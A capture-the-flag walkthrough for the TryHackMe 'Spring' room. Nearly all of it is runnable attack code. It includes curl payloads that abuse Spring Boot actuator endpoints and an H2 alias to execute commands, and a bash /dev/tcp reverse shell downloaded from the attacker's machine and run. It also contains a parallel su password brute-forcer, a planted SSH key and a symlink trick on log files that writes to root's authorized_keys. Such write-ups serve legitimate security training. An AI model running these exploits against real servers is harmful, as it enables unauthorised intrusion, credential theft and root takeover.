# Spring

**Room Link:** [https://tryhackme.com/room/spring](https://tryhackme.com/room/spring)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>



### TCP/443 - HTTPS

**Kali**

```
gobuster dir -u https://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
```

<figure><img src="../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
subl /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u https://spring.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
```

<figure><img src="../../.gitbook/assets/image (469).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u https://spring.thm/sources -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -k
```

<figure><img src="../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>

Changed the wordlist

**Kali**

```
gobuster dir -u https://spring.thm/sources/new -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt -x php,html,txt -k
```

<figure><img src="../../.gitbook/assets/image (468).png" alt=""><figcaption></figcaption></figure>

### GitDumper

**Kali**

```
pip install git-dumper
mkdir git
git-dumper https://spring.thm/sources/new/.git/ git/
cd git
git log


grep -r pass *
```

<figure><img src="../../.gitbook/assets/image (470).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
git diff 92b433a86a015517f746a3437ba3802be9146722 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
```

<figure><img src="../../.gitbook/assets/image (471).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (472).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (473).png" alt=""><figcaption></figcaption></figure>

## Initial Shell&#x20;

**Exploit:** [https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)



**Kali #1**

```
tcpdump -i ens5 icmp
```

**Kali #2**

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'ping -c 5 $KALI\');\"}' "https://$VICTIM/actuator/env" -k

curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**reverse.sh**

```
bash -c "bash -i >& /dev/tcp/$KALI/1337 0>&1"
```

**Kali #1**

```
python3 -m http.server 81
```

**Kali #2**

```
nc -lvnp 1337
```

Download payload

**Kali #3**

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'wget http://$KALI:81/reverse.sh -O /tmp/reverse.sh\');\"}' "https://$VICTIM/actuator/env" -k

curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
```

Run payload

**Kali #3**

```
curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'bash /tmp/reverse.sh\');\"}' "https://$VICTIM/actuator/env" -k

curl -X 'POST' -H 'Content-Type: application/json' -H 'x-9ad42dea0356cb04: 172.16.0.21' "https://$VICTIM/actuator/restart" -k
```



<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Get autocomplete

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```



We found one password within environment variables

**Victim**

```
env
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Bruteforce su



At this point we have two passwords that are very similar, neither of them are the password for johnsmith to login, the format is PrettyS3cure${keyword}Password123.

```
PrettyS3cureKeystorePassword123.
PrettyS3cureSpringPassword123.
```

**su\_brute\_force.sh**

```
#!/bin/bash

set -m #enable job control
export TOP_PID=$$ #get the current PID
trap "trap - SIGTERM && kill -- -$$" INT SIGINT SIGTERM EXIT #exit on trap

# https://github.com/fearside/ProgressBar/blob/master/progressbar.sh
# something to look at while waiting
function progressbar {
        let _progress=(${1}*100/${2}*100)/100
        let _done=(${_progress}*4)/10
        let _left=40-$_done

        _done=$(printf "%${_done}s")
        _left=$(printf "%${_left}s")

        printf "\rCracking : [${_done// /#}${_left// /-}] ${_progress}%%"
}

function brute() {
        keyword=$1 #get the word
        password="PrettyS3cure${keyword}Password123." #add it to our format
        output=$( ( sleep 0.2s && echo $password ) | script -qc 'su johnsmith -c "id"' /dev/null) # check the password
        if [[ $output != *"Authentication failure"* ]]; then #if password was correct
                printf "\rCreds Found! johnsmith:$password\n$output\nbye..." #print the password
                kill -9 -$(ps -o pgid= $TOP_PID  | grep -o '[0-9]*') #kill parent and other jobs
        fi
}

wordlist=$1 #get wordlist as parameter

count=$(wc -l $wordlist| grep -o '[0-9]*') #count how many words we have
current=1

while IFS= read -r line #for each line
do
        brute $line & #try the password
        progressbar ${current} ${count} #update progress bar. TODO:calculate ETA
        current=$(( current + 1 )) #increment
done < $wordlist #read the wordlist

wait #wait for active jobs
```

**Kali**

```
cat /usr/share/wordlists/rockyou.txt | grep -E ^[A-Z][a-z]+$ > capitalized_words.txt
```

**Victim**

```
wget http://$KALI:81/capitalized_words.txt -O /tmp/capitalized_words.txt
wget http://$KALI:81/su_brute_force.sh -O /tmp/su_brute_force.sh
chmod +x su_brute_force.sh
time bash su_brute_force.sh capitalized_words.txt
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su johnsmith
Password: PrettyS3cureAccountPassword123.
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh-keygen -t rsa
cat /root/.ssh/id_rsa.pub 
```



**Victim**

```

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2vjG2ZoKfoNoEF1ASSVX+M2hwD5g0PmUajFDBoDGrjM63T38/cadEHbJXgH8YS6syNLsf+mnSVeF9yWIeMLjfaeoIWE9UPCmS5OuPC2ZiAf+zTvo7X+OjnQKmHmNsQYJ8lhg24g3Gpw5rWreteGTMfmFPRBDNEX6J3JsNCdhoTjAhyRRRouUM9oMw1Yl4YcRAcK8xPU8ZuE6lk3kqzrrPhaCOafTdHvBKS+Q0Bn/Cq7V0ltBWkaSHIWRc50dMfwFHPR5DlYpuN6cOyIeF2L1LTcyPNmeeD/Na1d1RlRLL3HKNSW02T1z3hUAZTdmgEUvwz726qloHUmd8Hxo0Kq0j root@ip-10-10-228-158" > /home/johnsmith/.ssh/authorized_keys
```

**Kali**

```
su johnsmith@$VICTIM
```



## Privilege Escalation

**Victim**

```
vi /home/johnsmith/tomcatlogs/getroot.sh
```

**getroot.sh**

```
#!/bin/bash

#generate ssh key if it does not exists
[ -f ./key ] && true || ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ""
#read public key
pubkey=$(cat ./key.pub)

#send a shutdown request to the spring boot server
curl -X POST https://localhost/actuator/shutdown -H 'x-9ad42dea0356cb04: 172.16.0.21' -k

#get date as epoch format
d=$(date '+%s')

#let's assume 30 seconds is enough to restart the service
for i in {1..30}
do
 #create symlinks to /root/.ssh/authorized_keys for 30 seconds
 let time=$(( d + i ))
 ln -s /root/.ssh/authorized_keys "$time.log"
done

#wait for app to restart
sleep 30s

#send publickey as name to the greating server
curl --data-urlencode "name=$pubkey" https://localhost/ -k
sleep 5s

#connect as root
ssh  -o "StrictHostKeyChecking=no" -i ./key root@localhost
```

**Victim**

```
bash getroot.sh
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

